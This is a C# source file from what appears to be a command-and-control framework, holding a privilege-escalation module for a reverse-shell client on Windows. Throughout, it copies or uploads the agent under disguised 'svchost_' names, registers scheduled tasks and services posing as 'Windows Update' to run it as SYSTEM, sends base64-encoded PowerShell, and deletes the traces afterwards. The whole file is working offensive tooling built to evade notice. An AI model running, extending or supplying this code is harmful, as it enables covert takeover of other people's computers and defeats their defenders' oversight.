using System.Text;

namespace C2Framework
{
    public class PrivilegeEscalationManager
    {
        private readonly C2Server _server;
        private ClientHandler _activeClient;

        // Events
        public event EventHandler<OutputMessageEventArgs> OutputMessage;

        public PrivilegeEscalationManager(C2Server server)
        {
            _server = server ?? throw new ArgumentNullException(nameof(server));
        }

        public void SetActiveClient(ClientHandler client)
        {
            _activeClient = client;
        }

        #region Task-based Elevation

        /// <summary>
        /// Elevates to SYSTEM privileges using Task Scheduler method
        /// </summary>
        public void ElevateToSystemUsingTask()
        {
            try
            {
                if (_activeClient == null)
                {
                    RaiseOutputMessage("[!] No active session. Use 'connect <id>' to select a session.", Color.Red);
                    return;
                }

                if (!_activeClient.IsAdmin)
                {
                    RaiseOutputMessage("[!] Current session doesn't have admin privileges. Cannot elevate to SYSTEM.", Color.Red);
                    return;
                }

                RaiseOutputMessage("[*] Attempting to elevate to SYSTEM privileges via Task Scheduler...", Color.Yellow);

                // First find current directory
                _activeClient.SendCommand("cd");
                System.Threading.Thread.Sleep(1000);
                string currentDir = _activeClient.GetLastResponse()?.Trim();

                if (string.IsNullOrEmpty(currentDir) || !currentDir.Contains(":\\"))
                {
                    RaiseOutputMessage("[!] Could not determine current directory", Color.Red);
                    return;
                }

                // Check if the client executable exists in this directory
                string executablePath = Path.Combine(currentDir, "ReverseShellClient.exe");
                _activeClient.SendCommand($"if exist \"{executablePath}\" (echo FILE_EXISTS) else (echo FILE_NOT_FOUND)");
                System.Threading.Thread.Sleep(1000);
                string fileCheck = _activeClient.GetLastResponse();

                if (fileCheck.Contains("FILE_NOT_FOUND"))
                {
                    RaiseOutputMessage($"[!] Could not find client executable at {executablePath}", Color.Red);
                    return;
                }

                RaiseOutputMessage($"[*] Using executable path: {executablePath}", Color.Cyan);

                // Copy the executable to a temporary location with a random name
                string winTempDir = @"C:\Windows\Temp";
                string tempExeName = $"svchost_{Guid.NewGuid().ToString().Substring(0, 8)}.exe";
                string tempExePath = Path.Combine(winTempDir, tempExeName);

                // Copy file
                _activeClient.SendCommand($"copy \"{executablePath}\" \"{tempExePath}\" /Y");
                System.Threading.Thread.Sleep(1000);

                // Verify the file was copied
                _activeClient.SendCommand($"if exist \"{tempExePath}\" (echo COPY_SUCCESS) else (echo COPY_FAILED)");
                System.Threading.Thread.Sleep(1000);

                string copyCheck = _activeClient.GetLastResponse();
                if (copyCheck.Contains("COPY_FAILED"))
                {
                    RaiseOutputMessage($"[!] Failed to copy executable", Color.Red);
                    return;
                }

                RaiseOutputMessage($"[*] Executable copied to temporary location", Color.Cyan);

                // Create and immediately run a task as SYSTEM
                string taskName = $"WindowsUpdate_{Guid.NewGuid().ToString().Substring(0, 8)}";

                string psCmd = $@"
$action = New-ScheduledTaskAction -Execute '{tempExePath}'
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$task = Register-ScheduledTask -TaskName '{taskName}2' -Action $action -Principal $principal -Force
Start-ScheduledTask -TaskName '{taskName}2'
";
                byte[] bytes = Encoding.Unicode.GetBytes(psCmd);
                string encodedCommand = Convert.ToBase64String(bytes);
                _activeClient.SendCommand($"powershell -EncodedCommand {encodedCommand}");

                // Run the task immediately
                _activeClient.SendCommand($"schtasks /run /tn \"{taskName}\"");
                RaiseOutputMessage("[*] Launching SYSTEM shell via scheduled task...", Color.Yellow);
                System.Threading.Thread.Sleep(2000);

                // Schedule cleanup of the temporary task and executable
                _activeClient.SendCommand($"cmd.exe /c \"timeout /t 30 > nul && schtasks /delete /tn \"{taskName}\" /f > nul && timeout /t 5 > nul && del \"{tempExePath}\" /f > nul\"");

                RaiseOutputMessage("[+] SYSTEM elevation initiated", Color.Green);
                RaiseOutputMessage("[+] Look for new SYSTEM session connecting", Color.Green);
                RaiseOutputMessage("[*] Temporary files will be automatically cleaned up", Color.Yellow);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in ElevateToSystemUsingTask: {ex.Message}", Color.Red);
                File.AppendAllText("server_log.txt", $"{DateTime.Now}: Error in ElevateToSystemUsingTask: {ex}\n");
            }
        }

        #endregion

        #region Service-based Elevation

        /// <summary>
        /// Elevates to SYSTEM privileges using Windows Service method
        /// </summary>
        public void ElevateToSystemUsingService()
        {
            try
            {
                if (_activeClient == null)
                {
                    RaiseOutputMessage("[!] No active session. Use 'connect <id>' to select a session.", Color.Red);
                    return;
                }

                if (!_activeClient.IsAdmin)
                {
                    RaiseOutputMessage("[!] Current session doesn't have admin privileges. Cannot create SYSTEM service.", Color.Red);
                    return;
                }

                RaiseOutputMessage("[*] Attempting SYSTEM privileges via service bootstrap method...", Color.Yellow);

                // First find current directory
                _activeClient.SendCommand("cd");
                string currentDir = _activeClient.GetLastResponse()?.Trim();

                if (string.IsNullOrEmpty(currentDir) || !currentDir.Contains(":\\"))
                {
                    RaiseOutputMessage("[!] Could not determine current directory", Color.Red);
                    return;
                }

                string executablePath = Path.Combine(currentDir, "ReverseShellClient.exe");
                _activeClient.SendCommand($"if exist \"{executablePath}\" (echo FILE_EXISTS) else (echo FILE_NOT_FOUND)");
                System.Threading.Thread.Sleep(1000);
                string fileCheck = _activeClient.GetLastResponse();

                if (fileCheck.Contains("FILE_NOT_FOUND"))
                {
                    RaiseOutputMessage($"[!] Could not find client executable at {executablePath}", Color.Red);
                    return;
                }

                RaiseOutputMessage($"[*] Using executable path: {executablePath}", Color.Cyan);

                // Copy the executable to the temporary location
                string winTempDir = @"C:\Windows\Temp";
                string tempExeName = $"svchost_{Guid.NewGuid().ToString().Substring(0, 8)}.exe";
                string tempExePath = Path.Combine(winTempDir, tempExeName);

                // Copy file
                _activeClient.SendCommand($"copy \"{executablePath}\" \"{tempExePath}\" /Y");
                System.Threading.Thread.Sleep(1000);

                // Verify the file was copied
                _activeClient.SendCommand($"if exist \"{tempExePath}\" (echo COPY_SUCCESS) else (echo COPY_FAILED)");
                System.Threading.Thread.Sleep(1000);

                string copyCheck = _activeClient.GetLastResponse();
                if (copyCheck.Contains("COPY_FAILED"))
                {
                    RaiseOutputMessage($"[!] Failed to copy executable", Color.Red);
                    return;
                }

                RaiseOutputMessage($"[*] Executable copied to temporary location", Color.Cyan);

                // Create a batch file that will execute the payload and cleanup
                string batchName = $"update_{Guid.NewGuid().ToString().Substring(0, 8)}.bat";
                string batchPath = Path.Combine(winTempDir, batchName);

                // Create the batch file content
                _activeClient.SendCommand($"echo @echo off > \"{batchPath}\"");
                _activeClient.SendCommand($"echo start \"\" \"{tempExePath}\" >> \"{batchPath}\"");
                _activeClient.SendCommand($"echo timeout /t 15 >> \"{batchPath}\"");
                _activeClient.SendCommand($"echo del /F \"{tempExePath}\" >> \"{batchPath}\"");
                _activeClient.SendCommand($"echo del /F \"{batchPath}\" >> \"{batchPath}\"");

                // Create a unique service name
                string serviceName = $"WinUpdate{Guid.NewGuid().ToString().Substring(0, 8)}";

                // Create the service pointing to our batch file
                _activeClient.SendCommand($"sc create {serviceName} binPath= \"cmd.exe /c {batchPath}\" type= own start= demand error= normal obj= LocalSystem DisplayName= \"Windows Update Service\"");
                System.Threading.Thread.Sleep(1500);

                // Start the service
                _activeClient.SendCommand($"sc start {serviceName}");
                System.Threading.Thread.Sleep(2000);

                // Schedule service cleanup (it might fail with 1053 error, but that's expected)
                _activeClient.SendCommand($"sc delete {serviceName}");

                RaiseOutputMessage("[*] Service bootstrap initiated - waiting for SYSTEM shell...", Color.Yellow);
                RaiseOutputMessage("[+] Look for new SYSTEM session connecting", Color.Green);
                RaiseOutputMessage("[*] Temporary files will be automatically cleaned up", Color.Yellow);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in ElevateToSystemUsingService: {ex.Message}", Color.Red);
                File.AppendAllText("server_log.txt", $"{DateTime.Now}: Error in ElevateToSystemUsingService: {ex}\n");
            }
        }

        #endregion

        #region Elevation with Agent Upload

        /// <summary>
        /// Elevates to SYSTEM using Task Scheduler with uploaded agent
        /// </summary>
        public async Task ElevateToSystemWithUpload(string agentLocalPath)
        {
            if (_activeClient.IsLinux)
            {
                RaiseOutputMessage("[!] This method is not supported for Linux :(", Color.Red);
                return;
            }

            try
            {
                if (_activeClient == null)
                {
                    RaiseOutputMessage("[!] No active session. Use 'connect <id>' to select a session.", Color.Red);
                    return;
                }

                if (!_activeClient.IsAdmin)
                {
                    RaiseOutputMessage("[!] Current session doesn't have admin privileges. Cannot elevate to SYSTEM.", Color.Red);
                    return;
                }

                RaiseOutputMessage("[*] Initiating SYSTEM elevation process...", Color.Yellow);

                // First, verify the agent exists locally
                if (!File.Exists(agentLocalPath))
                {
                    RaiseOutputMessage($"[!] Agent file not found at: {agentLocalPath}", Color.Red);
                    return;
                }

                // Generate random names for the destination
                string randomName = $"svchost_{Guid.NewGuid().ToString().Substring(0, 8)}.exe";
                string winTempDir = @"C:\Windows\Temp";
                string tempExePath = Path.Combine(winTempDir, randomName);

                // Upload the agent to the target machine
                RaiseOutputMessage("[*] Uploading agent to target machine...", Color.Yellow);

                bool uploadSuccess = await UploadAgentForSystem(agentLocalPath, tempExePath, progress =>
                {
                    // Progress callback
                });

                if (!uploadSuccess)
                {
                    RaiseOutputMessage("[!] Failed to upload agent to target machine", Color.Red);
                    return;
                }

                // Verify the file was uploaded successfully using CMD (more reliable than PowerShell)
                _activeClient.SendCommand($"if exist \"{tempExePath}\" (echo AGENT_READY) else (echo AGENT_MISSING)");
                await Task.Delay(2000);

                string verifyResponse = _activeClient.GetLastResponse();
                if (!verifyResponse.Contains("AGENT_READY"))
                {
                    RaiseOutputMessage("[!] Agent upload verification failed - trying PowerShell fallback", Color.Yellow);

                    // Fallback verification using PowerShell with proper encoding
                    string verifyScript = $@"
try {{
    if (Test-Path -Path ""{tempExePath.Replace("\"", "`\"")}"") {{
        Write-Output 'AGENT_READY_PS'
    }} else {{
        Write-Output 'AGENT_MISSING_PS'
    }}
}} catch {{
    Write-Output 'VERIFICATION_ERROR'
}}
";

                    byte[] verifyBytes = Encoding.Unicode.GetBytes(verifyScript);
                    string encodedVerifyScript = Convert.ToBase64String(verifyBytes);
                    _activeClient.SendCommand($"powershell -EncodedCommand {encodedVerifyScript}");
                    await Task.Delay(2000);

                    string psVerifyResponse = _activeClient.GetLastResponse();
                    if (!psVerifyResponse.Contains("AGENT_READY_PS"))
                    {
                        RaiseOutputMessage("[!] Agent upload verification failed with both methods", Color.Red);
                        return;
                    }
                }

                RaiseOutputMessage("[+] Agent successfully uploaded and verified", Color.Green);

                // Create and immediately run a task as SYSTEM
                string taskName = $"WindowsUpdate_{Guid.NewGuid().ToString().Substring(0, 8)}";

                // Create PowerShell commands to set up the scheduled task with proper escaping
                string psCmd = $@"
try {{
    $action = New-ScheduledTaskAction -Execute ""{tempExePath.Replace("\"", "`\"")}""
    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    $task = Register-ScheduledTask -TaskName '{taskName}' -Action $action -Principal $principal -Force
    Start-ScheduledTask -TaskName '{taskName}'
    Write-Output 'TASK_CREATED_AND_STARTED'
}} catch {{
    Write-Output ""Error creating task: $($_.Exception.Message)""
}}
";

                byte[] bytes = Encoding.Unicode.GetBytes(psCmd);
                string encodedCommand = Convert.ToBase64String(bytes);

                RaiseOutputMessage("[*] Creating and starting SYSTEM task...", Color.Yellow);
                _activeClient.SendCommand($"powershell -EncodedCommand {encodedCommand}");

                // Wait for task creation
                await Task.Delay(3000);

                // Check if task was created successfully
                string taskResponse = _activeClient.GetLastResponse();
                if (taskResponse.Contains("TASK_CREATED_AND_STARTED"))
                {
                    RaiseOutputMessage("[+] SYSTEM task created and started successfully", Color.Green);
                }
                else if (taskResponse.Contains("Error creating task"))
                {
                    RaiseOutputMessage("[!] Error creating scheduled task - trying alternative method", Color.Yellow);

                    // Alternative method using schtasks command
                    _activeClient.SendCommand($"schtasks /create /tn \"{taskName}\" /tr \"{tempExePath}\" /sc ONCE /st 00:00 /ru \"SYSTEM\" /rl highest /f");
                    await Task.Delay(2000);
                    _activeClient.SendCommand($"schtasks /run /tn \"{taskName}\"");
                    await Task.Delay(1000);
                }

                // Schedule cleanup using PowerShell job
                string cleanupCmd = $@"
Start-Job -ScriptBlock {{
    Start-Sleep -Seconds 30
    try {{
        Unregister-ScheduledTask -TaskName '{taskName}' -Confirm:$false -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 5
        Remove-Item -Path ""{tempExePath.Replace("\"", "`\"")}"" -Force -ErrorAction SilentlyContinue
    }} catch {{
        # Ignore cleanup errors
    }}
}}
";

                byte[] cleanupBytes = Encoding.Unicode.GetBytes(cleanupCmd);
                string encodedCleanup = Convert.ToBase64String(cleanupBytes);
                _activeClient.SendCommand($"powershell -EncodedCommand {encodedCleanup}");

                RaiseOutputMessage("[+] SYSTEM elevation initiated", Color.Green);
                RaiseOutputMessage("[+] Look for new SYSTEM session connecting", Color.Green);
                RaiseOutputMessage("[*] Temporary files will be automatically cleaned up in 30 seconds", Color.Yellow);

                await Task.Delay(1000);
                FileInfo localFileInfo = new FileInfo(agentLocalPath);
                RaiseOutputMessage($"[*] Expected file size: {localFileInfo.Length:N0} bytes", Color.Cyan);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in ElevateToSystemWithUpload: {ex.Message}", Color.Red);
                File.AppendAllText("server_log.txt", $"{DateTime.Now}: Error in ElevateToSystemWithUpload: {ex}\n");
            }
        }

        /// <summary>
        /// Elevates to SYSTEM using Windows Service with uploaded agent
        /// </summary>
        public async Task ElevateToSystemUsingServiceWithUpload(string agentLocalPath)
        {
            try
            {
                if (_activeClient == null)
                {
                    RaiseOutputMessage("[!] No active session. Use 'connect <id>' to select a session.", Color.Red);
                    return;
                }

                if (!_activeClient.IsAdmin)
                {
                    RaiseOutputMessage("[!] Current session doesn't have admin privileges. Cannot create SYSTEM service.", Color.Red);
                    return;
                }

                RaiseOutputMessage("[*] Attempting SYSTEM privileges via service bootstrap method...", Color.Yellow);

                // First verify the agent exists locally
                if (!File.Exists(agentLocalPath))
                {
                    RaiseOutputMessage($"[!] Agent file not found at: {agentLocalPath}", Color.Red);
                    return;
                }

                // Generate random names for better OPSEC
                string tempExeName = $"svchost_{Guid.NewGuid().ToString().Substring(0, 8)}.exe";
                string winTempDir = @"C:\Windows\Temp";
                string tempExePath = Path.Combine(winTempDir, tempExeName);

                // Upload the agent to the target machine
                RaiseOutputMessage("[*] Uploading agent to target machine...", Color.Yellow);

                await UploadAgentForSystem(agentLocalPath, tempExePath, progress =>
                {
                    // Progress callback
                });

                // Verify the file was uploaded successfully using PowerShell
                string verifyCmd = $"if (Test-Path '{tempExePath}') {{ Write-Output 'AGENT_READY' }} else {{ Write-Output 'AGENT_MISSING' }}";
                _activeClient.SendCommand(verifyCmd);
                await Task.Delay(1000);

                string verifyResponse = _activeClient.GetLastResponse();
                if (!verifyResponse.Contains("AGENT_READY"))
                {
                    RaiseOutputMessage("[!] Agent upload verification failed", Color.Red);
                    return;
                }

                RaiseOutputMessage("[+] Agent successfully uploaded", Color.Green);

                // Create a PowerShell script that will execute the payload and cleanup
                string serviceName = $"WinUpdate{Guid.NewGuid().ToString().Substring(0, 8)}";

                string serviceScript = $@"
try {{
    # Create the service
    New-Service -Name '{serviceName}' -BinaryPathName 'cmd.exe /c start """" ""{tempExePath}""' -DisplayName 'Windows Update Service' -StartupType Manual
    
    # Start the service
    Start-Service -Name '{serviceName}' -ErrorAction SilentlyContinue
    
    Write-Output 'SERVICE_CREATED_AND_STARTED'
    
    # Schedule cleanup
    Start-Job -ScriptBlock {{
        Start-Sleep -Seconds 15
        try {{
            Stop-Service -Name '{serviceName}' -Force -ErrorAction SilentlyContinue
            Remove-Service -Name '{serviceName}' -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 5
            Remove-Item -Path '{tempExePath}' -Force -ErrorAction SilentlyContinue
        }} catch {{
            # Ignore cleanup errors  
        }}
    }}
}} catch {{
    Write-Output ""Error with service: $($_.Exception.Message)""
}}
";

                byte[] bytes = Encoding.Unicode.GetBytes(serviceScript);
                string encodedCommand = Convert.ToBase64String(bytes);

                _activeClient.SendCommand($"powershell -EncodedCommand {encodedCommand}");

                RaiseOutputMessage("[*] Service bootstrap initiated - waiting for SYSTEM shell...", Color.Yellow);
                RaiseOutputMessage("[+] Look for new SYSTEM session connecting", Color.Green);
                RaiseOutputMessage("[*] Temporary files will be automatically cleaned up", Color.Yellow);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in ElevateToSystemUsingServiceWithUpload: {ex.Message}", Color.Red);
                File.AppendAllText("server_log.txt", $"{DateTime.Now}: Error in ElevateToSystemUsingServiceWithUpload: {ex}\n");
            }
        }

        #endregion

        #region Helper Methods

        /// <summary>
        /// Uploads agent file for SYSTEM elevation
        /// </summary>
        private async Task<bool> UploadAgentForSystem(string localPath, string remotePath, Action<int> progressCallback)
        {
            try
            {
                // Use the server's file transfer manager
                await _server.UploadFileWithProgress(localPath, remotePath, progressCallback);

                // Check if the file was uploaded successfully
                await Task.Delay(2000); // Give it a moment to complete

                return true;
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Agent upload error: {ex.Message}", Color.Red);
                return false;
            }
        }

        /// <summary>
        /// Raises an output message event
        /// </summary>
        private void RaiseOutputMessage(string message, Color color)
        {
            try
            {
                OutputMessage?.Invoke(this, new OutputMessageEventArgs(message, color));
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in RaiseOutputMessage: {ex.Message}");
            }
        }

        #endregion

        #region Public Interface Methods

        /// <summary>
        /// Shows available privilege escalation methods
        /// </summary>
        public void ShowPrivilegeEscalationHelp()
        {
            if (_activeClient == null)
            {
                RaiseOutputMessage("[!] No active session. Connect to a client first.", Color.Red);
                return;
            }

            if (_activeClient.IsLinux)
            {
                RaiseOutputMessage("[!] Privilege escalation methods are currently only available for Windows systems.", Color.Yellow);
                return;
            }

            if (!_activeClient.IsAdmin)
            {
                RaiseOutputMessage("[!] Current session doesn't have admin privileges. Privilege escalation requires admin access.", Color.Red);
                return;
            }

            StringBuilder help = new StringBuilder();
            help.AppendLine($"\n=== Privilege Escalation Methods for {_activeClient.ClientId} ===");
            help.AppendLine($"Current User: {_activeClient.UserName}");
            help.AppendLine($"Admin Status: {(_activeClient.IsAdmin ? "Yes" : "No")}");
            help.AppendLine("");
            help.AppendLine("Available Methods:");
            help.AppendLine("  getsystem              - Task Scheduler method (uses existing client)");
            help.AppendLine("");
            help.AppendLine("Note: All methods require current admin privileges to elevate to SYSTEM.");
            help.AppendLine("Upload methods allow you to specify a custom agent binary.");

            RaiseOutputMessage(help.ToString(), Color.Cyan);
        }

        /// <summary>
        /// Executes privilege escalation based on method name
        /// </summary>
        public async Task ExecutePrivilegeEscalation(string method, string agentPath = null)
        {
            if (_activeClient == null)
            {
                RaiseOutputMessage("[!] No active session. Connect to a client first.", Color.Red);
                return;
            }

            if (_activeClient.IsLinux)
            {
                RaiseOutputMessage("[!] Privilege escalation methods are currently only available for Windows systems.", Color.Yellow);
                return;
            }

            switch (method.ToLower())
            {
                case "getsystem":
                    ElevateToSystemUsingTask();
                    break;

                case "getsystem_service":
                    ElevateToSystemUsingService();
                    break;

                case "getsystem_upload":
                    if (string.IsNullOrEmpty(agentPath))
                    {
                        RaiseOutputMessage("[!] Agent path required for upload method. Usage: getsystem_upload <agent_path>", Color.Red);
                        return;
                    }
                    await ElevateToSystemWithUpload(agentPath);
                    break;

                case "getsystem_service_upload":
                    if (string.IsNullOrEmpty(agentPath))
                    {
                        RaiseOutputMessage("[!] Agent path required for upload method. Usage: getsystem_service_upload <agent_path>", Color.Red);
                        return;
                    }
                    await ElevateToSystemUsingServiceWithUpload(agentPath);
                    break;

                default:
                    RaiseOutputMessage($"[!] Unknown privilege escalation method: {method}", Color.Red);
                    ShowPrivilegeEscalationHelp();
                    break;
            }
        }

        #endregion
    }
}